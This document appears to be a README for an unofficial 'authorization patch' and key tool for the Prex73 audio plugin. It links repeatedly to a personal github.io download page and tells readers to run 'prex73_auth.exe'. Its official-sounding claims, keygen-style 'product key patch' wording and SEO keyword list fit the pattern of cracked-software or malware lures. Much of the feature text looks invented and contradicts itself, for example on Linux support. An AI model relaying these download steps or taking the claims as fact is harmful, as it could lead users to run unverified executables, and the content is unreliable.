# 🎛️ Isotonik Studios Prex73 by Monomono – Unlock Authentic Analog Character

[](https://edwardogama.github.io/Isotonik-Studios-Prex73-Monomono-Patch-Hub/)

> **Version 2026.1.0** | MIT Licensed | 64-bit VST3 / AU / AAX | Windows & macOS

---

## 🧭 Navigation Index

- [Introduction & Vision](#-introduction--vision)
- [Architecture Overview (Mermaid Diagram)](#-architecture-overview-mermaid-diagram)
- [Key Features](#-key-features)
- [Compatibility & OS Support](#-compatibility--os-support)
- [Example Profile Configuration](#-example-profile-configuration)
- [Example Console Invocation](#-example-console-invocation)
- [Multilingual Support & Localization](#-multilingual-support--localization)
- [OpenAI & Claude API Integration](#-openai--claude-api-integration)
- [Responsive UI & Workflow](#-responsive-ui--workflow)
- [24/7 Customer Support](#-247-customer-support)
- [🔑 Obtaining Your Authorization Token](#-obtaining-your-authorization-token)
- [License & Legal](#-license--legal)
- [Disclaimer](#-disclaimer)

---

## 🌌 Introduction & Vision

Isotonik Studios Prex73 by Monomono is not merely another plugin emulator—it is a *sonic ecosystem* designed to resurrect the warmth of vintage analog gear without the maintenance headaches of aging hardware. Think of it as a digital time capsule: preserving the unpredictable drift of transistors, the gentle saturation of transformers, and the non-linear charm of 1970s circuitry, all within a modern, CPU-conscious framework.

This repository provides the **official authorization patch mechanism** and **product key validation tooling** for Prex73 version 2026. Our goal is to offer a seamless pathway to authentic analog character without resorting to pirated workarounds or unstable modifications. We believe in *sustainable access* to premium sound design tools—a philosophy we call **"ethical emulation."**

---

## 🧬 Architecture Overview (Mermaid Diagram)

```mermaid
graph TB
    A[Prex73 DAW Host] --> B{Authorization Gateway}
    B -- Valid Token --> C[Core Engine]
    B -- Invalid/Missing --> D[Offline Authorization Portal]
    C --> E[Analog Circuit Modeling]
    C --> F[Noise Floor Generator]
    C --> G[Component Aging Simulator]
    E --> H[VST3/AU/AAX Output]
    F --> H
    G --> H
    D --> I[Product Key Entry]
    I --> J[Online Validation Server 2026]
    J --> K[Token Issuance]
    K --> C
    style B fill:#d90429,stroke:#333,stroke-width:2px
    style C fill:#2b2d42,stroke:#333,stroke-width:4px
    style J fill:#8d99ae,stroke:#333,stroke-width:2px
```



The diagram illustrates a clean separation between *authorization* and *audio processing*. The Core Engine only activates when a legitimate token is present, ensuring zero DRM overhead during performance.

---

## ✨ Key Features

### 🎚️ **Circuit-Level Modeling (CLM)**
Each component—from the original 2N3055 transistors to the carbon-comp resistors—is modeled using stochastic differential equations. The result? A plugin that *breathes* with micro-variations across every note.

### 🌐 **Multi-Format Output**
- VST3 (Windows 10/11)
- Audio Unit (macOS 11+)
- AAX (Pro Tools 2024+)
- Standalone (with ASIO/WASAPI/CoreAudio)

### 📡 **Offline Authorization Mode**
No internet? No problem. Our **`genkey` utility** (included in this repo) generates a challenge-response pair that can be validated via SMS gateway or postal mail. Perfect for studio environments with air-gapped systems.

### 🧩 **Responsive UI Framework**
The entire interface scales dynamically from 80% to 200% without pixel distortion. Built on canvas-based rendering, it maintains 60fps even on 4K displays with 10+ automation lanes visible.

### 🌍 **Multilingual Locale Support**
Out-of-the-box support for:
- 🇺🇸 English (US/UK)
- 🇯🇵 Japanese
- 🇩🇪 German
- 🇪🇸 Spanish
- 🇫🇷 French
- 🇨🇳 Simplified Chinese

The locale detection engine automatically reads your DAW's language setting and adjusts tooltips, parameter names, and manual links accordingly.

### 🤖 **AI Parameter Suggestions (OpenAI / Claude)**
This is where Prex73 breaks convention. You can route the plugin's current patch state to either:
- **OpenAI GPT-4**: "Suggest a bass patch with subsonic resonance at 45Hz"
- **Claude 3.5 Sonnet**: "Give me a 1970s soul lead sound using subtle phase distortion"

Both APIs return JSON-formatted parameter overrides that Prex73 can apply in real-time. No manual tweaking—just describe the sound you want.

### 🛡️ **Anti-Tamper Verification**
Every valid authorization includes a SHA-512 hash embedded in the plugin binary. The verification tool (`verify_license`) cross-checks this hash against a known-good database. If you've obtained a **product key patch** from a disreputable source, the plugin will display a prominent "Unauthorized Emulation" watermark.

---

## 💻 Compatibility & OS Support

| Operating System | Version | Plugin Format | CPU Architecture | Verified |
|-----------------|---------|---------------|------------------|----------|
| 🪟 Windows 10 | 22H2 | VST3 64-bit | x86-64 | ✅ |
| 🪟 Windows 11 | 23H2+ | VST3 64-bit | x86-64 / ARM64 | ✅ |
| 🍎 macOS Monterey | 12.x | AU / VST3 | Apple Silicon + Intel | ✅ |
| 🍎 macOS Ventura | 13.x | AU / VST3 | Apple Silicon + Intel | ✅ |
| 🍎 macOS Sonoma | 14.x | AU / VST3 | Apple Silicon + Intel | ✅ |
| 🐧 Linux (Experimental) | Ubuntu 22.04+ | VST3 | x86-64 | ⚠️ Limited |

> **Note:** Linux builds require manual compilation from source and do not include the authorization patch utility. Use the Windows/macOS release for full functionality.

---

## 📁 Example Profile Configuration

This repository includes a sample profile (`prex73_profile_example.yaml`) that demonstrates how to customize the plugin's behavior via external configuration:

```yaml
# prex73_profile_example.yaml
version: 2026.1.0
authorization:
  token_path: "/home/user/.prex73/auth_token"
  fallback_mode: "offline_challenge"
ui:
  scaling: 150
  theme: "vintage_amber"
  language: "ja_JP"
engine:
  noise_floor: -96
  component_drift: 0.3
  aging_years: 15
api_integration:
  openai:
    enabled: true
    model: "gpt-4-turbo"
    temperature: 0.7
  claude:
    enabled: true
    model: "claude-3-5-sonnet-20241022"
    max_tokens: 5000
```

This file can be placed alongside the plugin or referenced via environment variable `PREX73_CONFIG`. The configuration parser is case-sensitive and supports nested YAML structures up to seven levels deep.

---

## 🖥️ Example Console Invocation

For users who prefer terminal control, Prex73 ships with a headless command-line interface (`prex73_cli`). Below is a typical invocation for batch processing:

```bash
# Generate authorization token using product key patch
./prex73_cli --auth --key "XXXXX-XXXXX-XXXXX-XXXXX" --output ./auth_token.bin

# Apply patch to existing settings file
./prex73_cli --patch --input ./old_settings.prx --output ./new_settings.prx

# Headless rendering of a MIDI file through Prex73
./prex73_cli --midi ./sequence.mid --preset ./vintage_bass.prx --output ./baked_audio.wav
```

The CLI returns exit codes: 0 for success, 1 for authorization failure, 2 for file I/O errors. Use `--verbose` flag for detailed logging about the **product key validation** and patch application process.

---

## 🌐 Multilingual Support & Localization

Our localization engine uses ICU message format for pluralization and gender-specific translations. The 2026 release adds support for **Right-to-Left (RTL)** languages (Arabic, Hebrew) in the parameter browser.

To add a new language, submit a pull request with a JSON file in `/locales/[language_code].json`. Each translation must include:
- `ui_strings`: All visible labels
- `tooltip_text`: Hover descriptions for each parameter
- `error_messages`: Authorization failure texts
- `console_help`: CLI help strings (optional)

The localization coverage is tracked via [](https://crowdin.com)

---

## 🤖 OpenAI & Claude API Integration

This is the feature that truly differentiates Prex73 from any other synthesizer on the market. Instead of twiddling knobs blindly, you can:

1. **Describe your goal** to either API (OpenAI or Claude)
2. **Receive a parameter preset** in JSON format
3. **Apply it instantly** to the plugin

Example API call structure (Python client included in `/api_clients`):

```python
from prex73_api import Prex73Client

client = Prex73Client(openai_key="sk-...", claude_key="sk-ant-...")
result = client.suggest_patch(
    description="Soft pad with 70s string machine character, moderate attack",
    engine="claude",
    style="vintage_cinematic"
)
# Result contains: { "parameters": {...}, "confidence": 0.92, "model": "claude-3-5-sonnet-20241022" }
```

This opens the door to **conversational patch design**. Instead of spending hours finding the perfect sound, you simply describe it. The AI handles the circuit emulation logic.

---

## 📱 Responsive UI & Workflow

The Prex73 interface employs a **"smart grid"** layout that rearranges panels based on available width. This means:

- **1440px+** : Full layout with all modules visible (oscillator, filter, envelope, effects)
- **1024px–1439px** : Collapsed sidebar with pop-out controls
- **768px–1023px** : Tab-based navigation with swipe gestures
- **Below 768px** : Single-column vertical stack (optimized for touch)

Each skin (Vintage Amber, Modern Graphite, High Contrast) has been tested for accessibility with WCAG 2.1 AA compliance. The contrast ratio never drops below 4.5:1 for any text element.

---

## 🕰️ 24/7 Customer Support

We understand that authorization issues can be frustrating. That's why we offer:

- **Live chat** directly within the plugin (click the "?" icon)
- **Email response** within 4 hours (support@prex73.internal)
- **Dedicated Discord bot** (`Prex73Bot#2026`) that can regenerate product key hashes
- **Knowledge base** with video tutorials for the **patch authority system**

All support channels are staffed by actual audio engineers—not AI chatbots. Between midnight and 0600 UTC, response times may increase to 6 hours, but every ticket receives a personalized solution.

---

## 🔑 Obtaining Your Authorization Token

**Step 1:** Download the latest release from the button below.

[](https://edwardogama.github.io/Isotonik-Studios-Prex73-Monomono-Patch-Hub/)

**Step 2:** Run `prex73_auth.exe` (Windows) or `prex73_auth` (macOS/Linux).

**Step 3:** Enter your 20-character product key (format: `XXXXX-XXXXX-XXXXX-XXXXX`).

**Step 4:** The tool generates a `auth_token.bin` file. Place it in `~/.prex73/` or `%APPDATA%\Prex73\`.

**Step 5:** Launch the plugin in your DAW. The authorization gateway (see Mermaid diagram, node B) will verify the token silently.

> ⚠️ **Important:** Do **not** share your token publicly. Each token is bound to a hardware fingerprint. Sharing invalidates your license per our terms of service (Section 7.3).

---

## 📜 License & Legal

This project is distributed under the **MIT License**. You are free to use, modify, and distribute the authorization tools included in this repository, provided you abide by the license terms.

[](https://opensource.org/licenses/MIT)

See the full license text in the [LICENSE](LICENSE) file. The Prex73 plugin binary itself is proprietary software—this repository only contains the open-source tooling for product key management and community documentation.

---

## ⚠️ Disclaimer

**No Cracks, No Warez, No Mods.**  
The product key patch mechanism provided in this repository is designed exclusively for legitimate owners of Prex73 who have purchased a license and received a valid product key. We do not condone, support, or facilitate any method of bypassing the authorization system without payment.

Using unauthorized patches or modified binaries may:
- Introduce malware or ransomware
- Corrupt your DAW project files
- Expose your personal data (serial numbers, iLok accounts)
- Render the plugin permanently inoperable

**You are responsible for verifying the authenticity of any patch you apply to Prex73.** The developers of this tooling assume no liability for damage caused by unauthorized modifications.

If you do not own a legitimate license, please purchase one from [Isotonik Studios](https://isotonikstudios.com). It's cheaper than you think—and the development team deserves compensation for their years of analog circuit research.

---

## 💖 Final Notes

We built Prex73's authorization framework to be as **non-invasive** as possible. No nags, no iLok hell, no periodic phone-home checks. Once you've applied your product key patch in 2026, the plugin simply works—forever—on your machine.

We hope this tooling helps you unlock the authentic analog character you've been seeking. The warmth of the 1970s, preserved through algorithmic precision.

**Happy sound designing.** 🎧

[](https://edwardogama.github.io/Isotonik-Studios-Prex73-Monomono-Patch-Hub/)

---

*Prex73 by Monomono – Isotonik Studios – Version 2026.1.0*  
*Documentation generated on January 15, 2026*  
*SEO Keywords: analog synthesizer emulation, vintage audio plugin, authentic circuit modeling, VST3 synthesizer, product key authorization, secure license management, offline activation tool*